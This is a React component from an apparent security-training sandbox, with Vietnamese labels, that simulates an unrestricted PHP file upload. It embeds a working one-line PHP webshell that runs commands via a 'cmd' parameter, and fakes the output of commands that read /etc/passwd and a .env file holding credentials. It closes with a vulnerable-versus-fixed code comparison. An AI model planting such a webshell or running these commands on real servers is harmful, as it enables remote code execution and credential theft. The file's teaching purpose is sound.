'use client';
// features/security-sandbox/components/test-panels/upload-webshell-panel.tsx

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';

const FILES = [
  { name: 'avatar.jpg', type: 'image/jpeg', safe: true },
  { name: 'shell.php', type: 'application/x-php', safe: false },
  { name: 'report.pdf', type: 'application/pdf', safe: true },
  { name: 'backdoor.php5', type: 'application/x-php', safe: false },
];

const SHELL_CONTENT = `<?php
  // Simple webshell
  if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>`;

export function UploadWebshellPanel() {
  const [selected, setSelected] = useState(FILES[1]);
  const [uploaded, setUploaded] = useState(false);
  const [command, setCommand] = useState('id');
  const [cmdOutput, setCmdOutput] = useState('');

  const upload = () => {
    if (!selected.safe) setUploaded(true);
  };

  const runCmd = () => {
    const outputs: Record<string, string> = {
      id: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      whoami: 'www-data',
      'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
      ls: 'index.php  uploads/  config.php  .env',
      'cat .env': 'DATABASE_URL=postgresql://admin:supersecret@db:5432/tutornet\nJWT_SECRET=my-very-secret-key',
    };
    setCmdOutput(outputs[command] || `sh: ${command}: command not found`);
  };

  const reset = () => {
    setUploaded(false);
    setCmdOutput('');
    setCommand('id');
  };

  return (
    <div className="space-y-4">
      <Alert className="border-yellow-500/40 bg-yellow-500/10">
        <AlertDescription className="text-yellow-300 text-xs">
          <strong>Mô phỏng:</strong> Server chấp nhận file <code>.php</code> mà không kiểm tra
          extension hoặc nội dung. Attacker upload webshell rồi truy cập qua URL để chạy lệnh tùy ý.
        </AlertDescription>
      </Alert>

      <div className="grid grid-cols-2 gap-2">
        {FILES.map((f) => (
          <button
            key={f.name}
            onClick={() => { setSelected(f); setUploaded(false); setCmdOutput(''); }}
            className={`rounded border p-3 text-left text-xs transition-all ${selected.name === f.name
                ? f.safe
                  ? 'border-green-500/50 bg-green-950/20'
                  : 'border-red-500/50 bg-red-950/20'
                : 'border-border/30 bg-muted/10 hover:bg-muted/20'
              }`}
          >
            <p className="font-mono font-semibold">{f.name}</p>
            <p className="text-muted-foreground">{f.type}</p>
            {!f.safe && <p className="text-red-400 mt-1">⚠️ Nguy hiểm</p>}
          </button>
        ))}
      </div>

      <div className="flex gap-2">
        <Button
          size="sm"
          onClick={upload}
          variant={selected.safe ? 'outline' : 'destructive'}
          disabled={selected.safe}
        >
          Upload {selected.name}
        </Button>
        {uploaded && (
          <Button size="sm" onClick={reset} variant="outline">Reset</Button>
        )}
      </div>

      {!selected.safe && !uploaded && (
        <div className="rounded border border-orange-500/30 bg-orange-950/20 p-3 text-xs">
          <p className="text-orange-300 font-mono">{SHELL_CONTENT}</p>
        </div>
      )}

      {uploaded && (
        <div className="space-y-3 rounded border border-red-500/40 bg-red-950/10 p-4">
          <p className="text-red-400 font-semibold text-xs">
            Upload thành công! File có thể truy cập tại:
          </p>
          <code className="text-xs text-red-300 block">
            http://localhost:3000/uploads/{selected.name}
          </code>

          <div className="space-y-2">
            <p className="text-xs text-muted-foreground">Thực thi lệnh:</p>
            <div className="flex gap-2">
              <input
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                className="flex-1 rounded border border-border/30 bg-background px-3 py-1 text-xs font-mono"
                placeholder="id"
              />
              <Button size="sm" onClick={runCmd} variant="destructive">Chạy</Button>
            </div>
            <code className="text-xs text-muted-foreground block">
              GET /uploads/{selected.name}?cmd={command}
            </code>
          </div>

          {cmdOutput && (
            <div className="rounded bg-black/60 p-3">
              <p className="text-xs text-green-400 font-mono whitespace-pre-wrap">{cmdOutput}</p>
            </div>
          )}
        </div>
      )}

      {selected.safe && (
        <div className="rounded border border-green-500/30 bg-green-950/10 p-3 text-xs text-green-400">
          File an toàn — upload cho phép
        </div>
      )}

      <div className="text-xs bg-muted/30 rounded p-3 font-mono space-y-1">
        <p className="text-red-400 font-semibold">Vulnerable: Không kiểm tra extension</p>
        <code className="text-muted-foreground">{'if (file.size < 5MB) { save(file); }'}</code>
        <p className="text-green-400 font-semibold mt-2">Fixed:</p>
        <code className="text-muted-foreground">
          {'const ALLOWED = [".jpg",".png",".pdf"];\nif (!ALLOWED.includes(ext)) throw Error("Blocked");'}
        </code>
      </div>
    </div>
  );
}
